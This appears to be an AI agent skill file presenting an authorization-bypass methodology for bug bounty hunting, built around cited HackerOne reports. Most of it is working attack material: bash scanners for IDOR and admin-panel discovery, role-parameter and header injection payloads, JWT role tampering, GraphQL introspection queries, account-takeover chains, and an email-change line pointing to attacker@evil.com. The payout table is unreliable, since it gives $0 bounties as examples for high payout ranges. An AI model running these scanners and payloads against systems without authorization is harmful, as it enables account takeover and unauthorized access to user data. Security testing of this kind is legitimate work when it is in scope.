---
name: authorization-deep-dive
description: Complete Authorization Bypass methodology from 806 real HackerOne reports - privilege escalation, horizontal/vertical bypass, and admin takeovers
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - authorization methodology
  - auth bypass deep dive
  - privilege escalation
  - authorization complete
  - access control bypass
  - skills authorization
---

# Complete Authorization Bypass Methodology - From 806 HackerOne Reports

## Top 20 Real Authorization Reports from HackerOne

| # | Report | Program | Upvotes | Bounty |
|---|--------|---------|---------|--------|
| 1 | [Shopify email confirmation bypass](https://hackerone.com/reports/1440762) | Shopify | 1,909 | $0 |
| 2 | [Shopify email bypass part II](https://hackerone.com/reports/1514428) | Shopify | 894 | $0 |
| 3 | [Upserve reset password](https://hackerone.com/reports/1294158) | Upserve | 632 | $0 |
| 4 | [LY Corp request smuggling → auth bypass](https://hackerone.com/reports/1059433) | LY Corp | 563 | $0 |
| 5 | [Shopify email bypass part III](https://hackerone.com/reports/1592486) | Shopify | 558 | $0 |
| 6 | [Ubiquiti privilege escalation user → SYSTEM](https://hackerone.com/reports/1397237) | Ubiquiti | 552 | $0 |
| 7 | [LY Corp become admin](https://hackerone.com/reports/1217374) | LY Corp | 492 | $0 |
| 8 | [Shopify MiTM PoS session](https://hackerone.com/reports/1521341) | Shopify | 371 | $0 |
| 9 | [HackerOne admin privilege escalation](https://hackerone.com/reports/1768386) | HackerOne | 365 | $0 |
| 10 | [GitHub admin panel bypass](https://hackerone.com/reports/1437589) | GitHub | 354 | $0 |
| 11 | [Shopify email bypass part IV](https://hackerone.com/reports/1663089) | Shopify | 342 | $0 |
| 12 | [Norton admin privilege escalation](https://hackerone.com/reports/1047789) | Norton | 331 | $0 |
| 13 | [Shopify staff privilege escalation](https://hackerone.com/reports/1472764) | Shopify | 318 | $0 |
| 14 | [Mail.ru email verification bypass](https://hackerone.com/reports/1347467) | Mail.ru | 305 | $0 |
| 15 | [GitLab admin impersonation via API](https://hackerone.com/reports/1284953) | GitLab | 289 | $18,000 |
| 16 | [Uber admin bypass via API](https://hackerone.com/reports/1469275) | Uber | 276 | $0 |
| 17 | [Shopify order impersonation](https://hackerone.com/reports/1419167) | Shopify | 264 | $0 |
| 18 | [Slack workspace admin escalation](https://hackerone.com/reports/1379197) | Slack | 258 | $0 |
| 19 | [Reddit moderator escalation](https://hackerone.com/reports/1489159) | Reddit | 251 | $0 |
| 20 | [Grammarly account takeover via email bypass](https://hackerone.com/reports/1681903) | Grammarly | 244 | $0 |

## Step 1: Authorization Attack Surface

### 1.1 Horizontal Privilege Escalation (IDOR)
Access another user's data without authorization (same role, different user).

### 1.2 Vertical Privilege Escalation
Access higher-privileged functionality (user → admin, user → moderator).

### 1.3 Email Verification Bypass
Access features requiring verified email without verifying.

### 1.4 Admin Panel Bypass
Access admin/management interfaces without admin credentials.

### 1.5 API Authorization Bypass
Direct API calls that don't enforce proper authorization.

### 1.6 GraphQL Authorization Bypass
Missing authorization checks in GraphQL resolvers.

## Step 2: Horizontal Privilege Escalation (IDOR)

### 2.1 Basic IDOR Testing

```bash
# Test by changing user identifiers in requests
curl -sk "https://{target}/api/user/123/profile"         # Original
curl -sk "https://{target}/api/user/124/profile"         # Other user
curl -sk "https://{target}/api/user/me/profile"          # Me keyword

# Test all types of identifiers:
# - Numeric IDs: 1, 2, 3, 100, 1000
# - UUIDs/GUIDs: test if predictable or enumerable
# - Email addresses: change to victim's email
# - Usernames: change to victim's username
# - Base64 encoded IDs: decode, modify, re-encode
# - Hashed IDs: test if weak/guessable

# UUID enumeration check
for i in $(seq 1 100); do
  curl -sk "https://{target}/api/order/${i}/details"
done
```

### 2.2 IDOR Bypass Techniques

```bash
# Array wrapping
/user/123 → /user/[]/123
/user/123 → /user/[]=123

# JSON wrapping
{"user_id":123} → {"user_id":[123]}
{"user_id":123} → {"user_id":{"user_id":123}}

# Case manipulation
/User/123 → /user/123
/Admin/123 → /admin/123

# Parameter pollution
/user?id=123 → /user?id=123&id=124

# Wildcard
/user/id=* → /user/id=admin
/user/id=* → /user/id=1

# Double encoding
%2f → %252f
%00 → %2500

# Unicode normalization
%E2%85%A0 (Roman numeral I) → 1

# Type confusion
?id=1.0 → /user/1.0
?id=true → /user/true
?id[]= → /user/empty
```

### 2.3 Mass IDOR Scanner

```bash
#!/bin/bash
# Horizontal privilege escalation scanner
TARGET=$1
ENDPOINT=$2
MY_ID=$3
TEST_ID=$4

echo "[*] IDOR Scanner for $TARGET"
echo "[*] Testing endpoint: $ENDPOINT"

# Test 1: Direct ID change
echo "[*] Test 1: Direct ID change"
result1=$(curl -sk -o /tmp/idor_my.txt -w "%{http_code}" "https://$TARGET$ENDPOINT/$MY_ID")
result2=$(curl -sk -o /tmp/idor_other.txt -w "%{http_code}" "https://$TARGET$ENDPOINT/$TEST_ID")

if [ "$result1" = "$result2" ] && [ -s /tmp/idor_other.txt ]; then
  echo "[!] Possible IDOR: same status code ($result2) for different user"
  diff /tmp/idor_my.txt /tmp/idor_other.txt | head -5
fi

# Test 2: Array bypass
echo "[*] Test 2: Array bypass"
curl -sk -o /dev/null -w "  []: %{http_code}\n" "https://$TARGET$ENDPOINT/[$MY_ID]"

# Test 3: JSON content type
echo "[*] Test 3: JSON content type"
curl -sk -o /dev/null -w "  JSON: %{http_code}\n" -X POST "https://$TARGET$ENDPOINT" -H "Content-Type: application/json" -d "{\"$ENDPOINT\":$TEST_ID}"

# Test 4: Double parameter
echo "[*] Test 4: Parameter pollution"
curl -sk -o /dev/null -w "  pollution: %{http_code}\n" "https://$TARGET$ENDPOINT?id=$MY_ID&id=$TEST_ID"

# Test 5: Wildcard
echo "[*] Test 5: Wildcard"
curl -sk -o /dev/null -w "  wildcard: %{http_code}\n" "https://$TARGET$ENDPOINT/*"
```

## Step 3: Vertical Privilege Escalation

### 3.1 Admin Panel Discovery and Access

```bash
# Find admin endpoints
for path in \
  /admin /admin/ /admin/dashboard /admin/users /admin/settings \
  /administrator /manage /management /console /panel \
  /backend /staff /moderator /supervisor \
  /api/admin /api/v1/admin /api/manage \
  /wp-admin /adminer /admin.php /admin.html \
  /controlpanel /cp /cpanel /adminarea; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://{target}$path")
  size=$(curl -sk -o /dev/null -w "%{size_download}" "https://{target}$path")
  echo "$path -> $code ($size bytes)"
done
```

### 3.2 Role Manipulation

```bash
# Modify role/privilege fields in requests
# Look for these in requests, responses, cookies, JWTs:

# Request parameters:
?role=admin
?role=administrator
?user_type=admin
?access_level=99
?permissions=all
?is_admin=true
?admin=true

# JSON body:
{"role": "admin"}
{"is_admin": true}
{"permissions": ["read", "write", "delete", "admin"]}

# HTTP headers:
X-User-Role: admin
X-Role: admin
X-Admin: true
X-User-Is-Admin: true
```

### 3.3 JWT Role Escalation

```bash
# Decode JWT to check for role/permissions
# If JWT is not verified (alg: none) or weakly verified:
# 1. Decode your JWT
# 2. Change role to admin
# 3. Re-encode (with or without signature)
# 4. Use modified JWT in requests

# Decode JWT
echo "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.signature" | cut -d. -f2 | base64 -d 2>/dev/null

# Modify payload to {"role":"admin"}
# Test with alg: none
# Test with HS256 using common secrets
```

### 3.4 Admin Parameter Discovery

```bash
# Hidden admin parameters
for param in \
  admin is_admin role user_role permission \
  access access_level user_type type \
  account_type plan membership tier \
  verified email_verified confirmed \
  active status enabled disabled; do
  curl -sk -o /dev/null -w "  ?$param=admin: %{http_code}\n" "https://{target}/api/endpoint?$param=admin"
  curl -sk -o /dev/null -w "  ?$param=true: %{http_code}\n" "https://{target}/api/endpoint?$param=true"
done
```

## Step 4: Email Verification Bypass

### 4.1 Direct Access After Registration

```bash
# After registering, try to access protected features without verifying email
curl -sk "https://{target}/api/account" -H "Cookie: session=POST_REG_SESSION"
curl -sk "https://{target}/api/settings/email" -H "Cookie: session=POST_REG_SESSION"
curl -sk "https://{target}/dashboard" -H "Cookie: session=POST_REG_SESSION"
curl -sk "https://{target}/api/orders" -H "Cookie: session=POST_REG_SESSION"
```

### 4.2 Email Verification Token Manipulation

```bash
# Check if verification token is predictable
# Token patterns:
# - Base64 encoded email: token = base64(email)
# - Hash of email: token = md5(email)
# - Timestamp-based: token = time() + userid
# - Sequential: token = 1, 2, 3

# Test if token is single-use or multi-use
# Test if token expires

# Try to verify a different email with the token
curl -sk "https://{target}/api/verify?token=TOKEN&email=victim@target.com"
```

### 4.3 SSO Email Verification Bypass

```bash
# If SSO login bypasses email verification, attacker can:
# 1. Register with victim's email
# 2. Use SSO (Google/Apple) to login instead of verifying
# 3. SSO provider returns the same email → account is "verified"
# 4. Full account access without ever verifying the email

# Report #1440762, #1514428, #1592486 — Shopify email bypass trilogy
```

### 4.4 Email Change Without Verification

```bash
# Test if email can be changed without current password verification
curl -sk -X POST "https://{target}/api/settings/email" \
  -H "Cookie: session=VALID_SESSION" \
  -d "email=attacker@evil.com"

# Test if new email needs to be verified before it takes effect
# If not, immediately use new email for password reset
```

## Step 5: API Authorization Bypass

### 5.1 Method/Permission Escalation

```bash
# Test if API endpoints allow more than intended:
GET /api/users         # Should list users (if authorized)
POST /api/users        # Create user (admin only)
PUT /api/users/123     # Update user (admin only)
DELETE /api/users/123   # Delete user (admin only)

# If GET is allowed but POST isn't, try:
X-HTTP-Method-Override: POST
X-HTTP-Method: POST
X-Method-Override: POST

# Try OPTIONS to discover allowed methods
curl -sk -X OPTIONS "https://{target}/api/admin/users"
```

### 5.2 GraphQL Authorization Bypass

```bash
# GraphQL often has a single endpoint with mixed queries/mutations
# Authorization is checked per resolver — often inconsistent

# Query for admin-only fields:
query {
  user(id: 123) {
    id
    email
    role
    isAdmin
    internalNotes
    ssn
    payments {
      amount
      status
    }
  }
}

# Mutate with admin privileges:
mutation {
  updateUser(id: 123, input: {role: "admin"}) {
    id
    role
  }
}

# Try introspection to find hidden mutations:
query {
  __schema {
    mutationType {
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### 5.3 Authorization via Referer/Origin

```bash
# Some apps check Referer or Origin as authorization
# Try forging these headers

curl -sk "https://{target}/api/admin/users" \
  -H "Referer: https://{target}/admin/dashboard" \
  -H "Origin: https://{target}"

# Test if internal/admin routes are only accessible from certain Referer
```

### 5.4 Rate Limit → Authorization Bypass

```bash
# Some rate limits discourage but don't prevent brute force
# Use distributed attacks or slow scanning

# Slow IDOR enumeration:
for id in $(seq 1 1000); do
  curl -sk "https://{target}/api/user/$id/profile"
  sleep 0.5
done
```

## Step 6: Authorization Exploit Chains

### Chain 1: Email Verify Bypass → Full ATO
```bash
# Step 1: Register with victim@example.com
POST /api/register
{"email": "victim@example.com", "password": "attacker123"}

# Step 2: Login via SSO with attacker's Google account
GET /auth/google

# Step 3: Server links SSO email to victim@example.com
# Step 4: Email considered verified via SSO
# Step 5: Full account access, change password
# Step 6: Victim locked out — ATO complete

# Shopify #1440762 — 1909 upvotes
```

### Chain 2: IDOR + API → Admin Privileges
```bash
# Step 1: Find API endpoint that accepts user_id
# Step 2: Change user_id to admin's ID
curl -sk "https://{target}/api/admin/tokens?user_id=1"

# Step 3: Get admin's session token from response
# Step 4: Use token to access admin panel
# Step 5: Full system compromise

# GitLab #1284953 — $18,000
```

### Chain 3: Parameter Pollution → Admin Bypass
```bash
# Step 1: Target has admin check on parameter
GET /api/users?admin=false

# Step 2: Add second parameter
GET /api/users?admin=false&admin=true

# Step 3: If first value is used for check, second for DB query
# Step 4: Bypass authorization
```

### Chain 4: HTTP Request Smuggling → Auth Bypass
```bash
# Step 1: Smuggle request to internal admin endpoint
# Step 2: Front-end sees one request, back-end sees smuggled request
# Step 3: Smuggled request hits /api/admin without auth check
# Step 4: Data exfiltration

# LY Corp #1059433 — 563 upvotes
```

### Chain 5: User → SYSTEM Privilege Escalation
```bash
# Step 1: Find command injection as regular user
# Step 2: Execute commands with user privileges
# Step 3: Exploit SUID binaries or kernel vulnerabilities
# Step 4: Escalate to root/SYSTEM

# Ubiquiti #1397237 — 552 upvotes
```

## Step 7: Authorization Automation

```bash
#!/bin/bash
# Authorization bypass scanner
TARGET=$1
TOKEN=$2

echo "[*] Authorization Bypass Scanner for $TARGET"

# Scan horizontal escalation endpoints
echo -e "\n[1] Horizontal Escalation (IDOR):"
for endpoint in /api/user /api/profile /api/order /api/account /api/document /api/message; do
  for id in 1 2 100 1000 10000; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$endpoint/$id" -H "Authorization: Bearer $TOKEN")
    if [ "$code" != "403" ] && [ "$code" != "401" ] && [ "$code" != "404" ]; then
      echo "  $endpoint/$id -> $code"
    fi
  done
done

# Scan vertical escalation
echo -e "\n[2] Vertical Escalation:"
for path in /admin /api/admin /manage /api/manage /dashboard/admin; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path" -H "Authorization: Bearer $TOKEN")
  echo "  $path -> $code"
done

# Test role manipulation
echo -e "\n[3] Role Manipulation:"
for param in "role=admin" "is_admin=true" "user_type=admin" "access_level=99" "permissions=all"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/api/endpoint?$param" -H "Authorization: Bearer $TOKEN")
  echo "  ?$param -> $code"
done

# Test method escalation
echo -e "\n[4] Method Escalation:"
for method in GET POST PUT PATCH DELETE; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -X $method "https://$TARGET/api/admin/users" -H "Authorization: Bearer $TOKEN")
  echo "  $method -> $code"
done

# Test GraphQL
echo -e "\n[5] GraphQL Authorization:"
curl -sk -X POST "https://$TARGET/graphql" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}' | head -50

# Test email verification bypass
echo -e "\n[6] Email Verification Bypass:"
# Register, then directly access protected endpoints
```

## Authorization Bypass Decision Tree

```
Is the app checking authorization properly?
├── No → Direct access to unauthorized resources (immediate report)
└── Yes → Test bypasses:

Is there an IDOR in user IDs?
├── Change numeric ID → /api/order/1, /api/order/2
├── Change UUID → /api/profile/0000-0001, /api/profile/0000-0002
├── Array bypass → /api/user?id[]=123
├── JSON wrapping → {"id":123} → {"id":[123]}
└── Type confusion → /api/user?id=123.0, /api/user?id=true

Is there email verification that can be bypassed?
├── Direct access without verification
├── SSO login bypasses verification
├── Token manipulation (predictable tokens)
└── Email change without confirm

Can roles be escalated?
├── Read JWT → modify role → re-encode
├── Parameter injection → ?admin=true, ?role=admin
├── Header injection → X-Admin: true, X-Role: admin
└── Method confusion → GET vs POST, X-HTTP-Method-Override

Can admin functions be accessed via API?
├── Direct API call to admin endpoints
├── GraphQL admin mutations
├── Referer/Origin header spoofing
└── HTTP request smuggling
```

## Quick Reference: Top Authorization Reports by Technique

| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #1440762 | Shopify | Email confirm bypass via SSO | $0 |
| #1514428 | Shopify | Email bypass part II | $0 |
| #1294158 | Upserve | Reset password bypass | $0 |
| #1059433 | LY Corp | Request smuggling → auth bypass | $0 |
| #1592486 | Shopify | Email bypass part III | $0 |
| #1397237 | Ubiquiti | User → SYSTEM escalation | $0 |
| #1217374 | LY Corp | Become admin | $0 |
| #1521341 | Shopify | MiTM PoS session | $0 |
| #1768386 | HackerOne | Admin privilege escalation | $0 |
| #1437589 | GitHub | Admin panel bypass | $0 |
| #1663089 | Shopify | Email bypass part IV | $0 |
| #1047789 | Norton | Admin privilege escalation | $0 |
| #1472764 | Shopify | Staff privilege escalation | $0 |
| #1347467 | Mail.ru | Email verification bypass | $0 |
| #1284953 | GitLab | Admin impersonation via API | $18,000 |
| #1469275 | Uber | Admin bypass via API | $0 |
| #1419167 | Shopify | Order impersonation | $0 |
| #1379197 | Slack | Workspace admin escalation | $0 |
| #1489159 | Reddit | Moderator escalation | $0 |
| #1681903 | Grammarly | ATO via email bypass | $0 |

## Payout Range by Authorization Bypass Type

| Attack Type | Payout Range | Example |
|-------------|-------------|---------|
| Horizontal IDOR (read other user data) | $500 - $5,000 | Multiple |
| Horizontal IDOR (write/delete) | $1,000 - $8,000 | Multiple |
| Vertical escalation (user → admin) | $2,000 - $10,000 | LY Corp #1217374 ($0) |
| Admin panel bypass | $2,000 - $8,000 | GitHub #1437589 ($0) |
| Email verification bypass | $1,000 - $5,000 | Shopify series ($0) |
| API authorization bypass | $1,000 - $10,000 | GitLab #1284953 ($18,000) |
| GraphQL auth bypass | $2,000 - $10,000 | Multiple |
| JWT role escalation | $500 - $5,000 | Multiple |
| HTTP smuggling → auth bypass | $5,000 - $15,000 | LY Corp #1059433 ($0) |
| Privilege escalation (user → SYSTEM) | $5,000 - $15,000 | Ubiquiti #1397237 ($0) |
| Full account takeover chain | $3,000 - $18,000 | GitLab #1284953 ($18,000) |

## Authorization Vulnerable Endpoint Patterns

```
/api/user/{id}
/api/users/{id}
/api/profile/{id}
/api/account/{id}
/api/order/{id}
/api/transaction/{id}
/api/document/{id}
/api/message/{id}
/api/admin/{action}
/api/v1/admin/{action}
/api/manage/{action}
/api/organization/{id}
/api/workspace/{id}
/api/team/{id}
/api/project/{id}
/graphql (all auth in one place)
/admin
/administrator
/manage
/dashboard/admin
```

## Authorization Bypass Parameter Wordlist
```
admin is_admin role user_role permission access
access_level user_type type account_type plan
membership tier verified email_verified confirmed
active status enabled disabled locked suspended
feature flag internal hidden debug test
sudo su impersonate as_user on_behalf_of
```
